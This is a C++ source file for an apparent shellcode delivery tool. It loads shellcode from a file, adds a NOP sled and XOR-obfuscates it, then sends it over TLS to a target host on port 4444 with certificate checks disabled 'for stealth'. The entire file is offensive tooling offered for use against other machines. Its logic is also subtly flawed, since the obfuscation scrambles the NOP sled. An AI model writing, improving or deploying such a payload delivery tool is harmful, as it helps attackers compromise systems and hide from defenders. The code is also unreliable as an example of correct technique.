#include <iostream>
#include <fstream>
#include <vector>
#include <boost/asio.hpp>
#include <boost/variant.hpp>
#include <boost/asio/ssl.hpp>
#include <random>
#include <algorithm>

namespace asio = boost::asio;
namespace ssl = boost::asio::ssl;

class Payload {
public:
    virtual void add_shellcode(const std::vector<uint8_t>& shellcode) = 0;
    virtual void build() = 0;
    virtual std::vector<uint8_t> get_payload() const = 0;
    virtual void obfuscate_payload() = 0;
    virtual ~Payload() = default;
};

class TcpPayload : public Payload {
public:
    TcpPayload(asio::io_context& io_context, const std::string& host, uint16_t port)
        : io_context_(io_context),
          resolver_(io_context),
          socket_(io_context, ssl_context_),
          host_(host),
          port_(port) {
        ssl_context_.set_verify_mode(ssl::verify_none);  // Disable SSL verification for stealth
        socket_.set_verify_callback([](bool, ssl::verify_context&) { return true; });
    }

    void add_shellcode(const std::vector<uint8_t>& shellcode) override {
        payload_.insert(payload_.end(), shellcode.begin(), shellcode.end());
    }

    void build() override {
        // Add NOP sled and other obfuscation techniques
        std::vector<uint8_t> nop_sled(100, 0x90); // Increase NOP sled size for buffer evasion
        payload_.insert(payload_.begin(), nop_sled.begin(), nop_sled.end());
        obfuscate_payload(); // Call to obfuscate the payload before transmission
    }

    std::vector<uint8_t> get_payload() const override {
        return payload_;
    }

    void obfuscate_payload() override {
        // Simple XOR obfuscation with a random key (could be more sophisticated)
        uint8_t key = generate_random_key();
        for (auto& byte : payload_) {
            byte ^= key;
        }
        // Store the key in a predefined part of the payload for de-obfuscation
        payload_.insert(payload_.begin(), key);
    }

    void start_connection() {
        auto endpoints = resolver_.resolve(host_, std::to_string(port_));
        asio::async_connect(socket_.lowest_layer(), endpoints,
            [this](const asio::error_code& ec, const asio::ip::tcp::endpoint&) {
                if (!ec) {
                    std::cout << "Connection established!" << std::endl;
                    socket_.async_handshake(ssl::stream_base::client,
                        [this](const asio::error_code& handshake_ec) {
                            if (!handshake_ec) {
                                send_payload();
                            } else {
                                std::cerr << "SSL handshake failed: " << handshake_ec.message() << std::endl;
                            }
                        });
                } else {
                    std::cerr << "Error establishing connection: " << ec.message() << std::endl;
                }
            });
    }

private:
    asio::io_context& io_context_;
    asio::ip::tcp::resolver resolver_;
    ssl::context ssl_context_{ssl::context::sslv23_client};
    ssl::stream<asio::ip::tcp::socket> socket_;
    std::vector<uint8_t> payload_;
    std::string host_;
    uint16_t port_;

    uint8_t generate_random_key() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(1, 255);
        return static_cast<uint8_t>(dis(gen));
    }

    void send_payload() {
        asio::async_write(socket_, asio::buffer(payload_, payload_.size()),
            [this](const asio::error_code& ec, std::size_t bytes_transferred) {
                if (!ec) {
                    std::cout << "Payload sent successfully!" << std::endl;
                } else {
                    std::cerr << "Error sending payload: " << ec.message() << std::endl;
                }
                socket_.lowest_layer().close(); // Close the connection after sending
            });
    }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: shellcode_injector <shellcode_file> <target_host>" << std::endl;
        return 1;
    }

    std::ifstream shellcode_file(argv[1], std::ios::binary | std::ios::ate);
    if (!shellcode_file.is_open()) {
        std::cerr << "Error opening shellcode file: " << argv[1] << std::endl;
        return 1;
    }

    size_t shellcode_size = shellcode_file.tellg();
    if (shellcode_size > 4096) { // Add a size check for the shellcode
        std::cerr << "Shellcode size exceeds the maximum limit of 4096 bytes." << std::endl;
        return 1;
    }

    shellcode_file.seekg(0);
    std::vector<uint8_t> shellcode(shellcode_size);
    if (!shellcode_file.read(reinterpret_cast<char*>(shellcode.data()), shellcode_size)) {
        std::cerr << "Error reading shellcode from file: " << argv[1] << std::endl;
        return 1;
    }

    asio::io_context io_context;
    TcpPayload payload(io_context, argv[2], 4444);
    payload.add_shellcode(shellcode);
    payload.build();
    payload.start_connection();

    io_context.run();

    return 0;
}

